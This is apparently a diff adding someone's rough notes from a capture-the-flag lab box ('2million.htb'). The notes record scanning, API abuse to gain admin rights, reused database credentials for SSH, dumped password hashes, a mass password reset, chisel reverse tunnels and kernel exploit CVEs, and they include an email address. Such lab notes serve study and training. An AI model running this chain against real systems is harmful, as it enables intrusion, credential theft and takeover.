@@ -1,0 +1,124 @@
+ssh admin@10.10.11.221
+SuperDuperPass123
+
+
+
+------------------------------------------------------------------------------------------------------------------------
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-25 15:41 +07
+Nmap scan report for 10.10.11.221
+Host is up (0.078s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+80/tcp open  http    nginx
+|_http-title: Did not follow redirect to http://2million.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 27.74 seconds
+
+
+
+------------------------------------------------------------------------------------------------------------------------
+
+dirsearch -u http://2million.htb -e "*" -r --cookie='PHPSESSID=2ihma7e5qtut6umla3cfogkqrd'
+wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.2million.htb" --hc 403,400,301 {--hl 198} -t 50 10.10.11.221
+
+
+    console.log(p)
+    return p
+
+function verifyInviteCode(code){var formData={"code":code};$.ajax({type:"POST",dataType:"json",data:formData,url:'/api/v1/invite/verify',success:function(response){console.log(response)},error:function(response){console.log(response)}})}function makeInviteCode(){$.ajax({type:"POST",dataType:"json",url:'/api/v1/invite/how/to/generate',success:function(response){console.log(response)},error:function(response){console.log(response)}})}
+
+POST /api/v1/invite/how/to/generate
+
+{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}
+
+
+┌──(kali㉿kali)-[~/stuffs/htb/twomillion.htb]
+└─$ echo 'REpUQVgtMk1TSlktVVVXQjAtME9GWFc=' |base64 -d     
+DJTAX-2MSJY-UUWB0-0OFXW   
+
+
+http://2million.htb/api/v1
+	
+v1	
+user	
+GET	
+/api/v1	"Route List"
+/api/v1/invite/how/to/generate	"Instructions on invite code generation"
+/api/v1/invite/generate	"Generate invite code"
+/api/v1/invite/verify	"Verify invite code"
+/api/v1/user/auth	"Check if user is authenticated"
+/api/v1/user/vpn/generate	"Generate a new VPN configuration"
+/api/v1/user/vpn/regenerate	"Regenerate VPN configuration"
+/api/v1/user/vpn/download	"Download OVPN file"
+POST	
+/api/v1/user/register	"Register a new user"
+/api/v1/user/login	"Login with existing user"
+admin	
+GET	
+/api/v1/admin/auth	"Check if user is admin"
+POST	
+/api/v1/admin/vpn/generate	"Generate VPN for specific user"
+PUT	
+/api/v1/admin/settings/update	"Update user settings"
+
+
+PUT /api/v1/admin/settings/update HTTP/1.1
+Host: 2million.htb
+Content-Type: application/json
+Content-Length: 43
+Cookie: PHPSESSID=jmi7u14cvh4t6ou0hc1dl7f9q5
+
+
+{"email":"ns0507@gmail.com","is_admin":1}
+
+
+DB_HOST=127.0.0.1
+DB_DATABASE=htb_prod
+DB_USERNAME=admin
+DB_PASSWORD=SuperDuperPass123
+
+ssh admin@10.10.11.221
+SuperDuperPass123
+------------------------------------------------------------------------------------------------------------------------
+ssh admin@10.10.11.221
+SuperDuperPass123
+
+tcp        0      0 127.0.0.1:11211         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3306  
+
+
+mysql -u admin -p
+
+| 11 | TRX          | trx@hackthebox.eu          | $2y$10$TG6oZ3ow5UZhLlw7MDME5um7j/7Cw1o6BhY8RhHMnrr2ObU3loEMq |        1 |
+| 12 | TheCyberGeek | thecybergeek@hackthebox.eu | $2y$10$wATidKUukcOeJRaBpYtOyekSpwkKghaNYr5pjsomZUKAd0wbzw4QK 
+
+$2y$10$wATidKUukcOeJRaBpYtOyekSpwkKghaNYr5pjsomZUKAd0wbzw4QK
+$2y$10$TG6oZ3ow5UZhLlw7MDME5um7j/7Cw1o6BhY8RhHMnrr2ObU3loEMq
+
+
+
+UPDATE users SET password = "$2y$10$Wc6ibmE5jTpKeywxDRupWOPV5Hk68U.X9Msuue.797ZBEvU///Sri";
+
+
+./chisel64 server -p 8088 --reverse
+./chisel64 client 10.10.16.72:8088 R:8001:127.0.0.1:8001
+./chisel64 client 10.10.16.72:8080 R:socks
+
+
+CVE-2023-0386
+CVE-2023-4911
+
+------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+------------------------------------------------------------------------------------------------------------------------
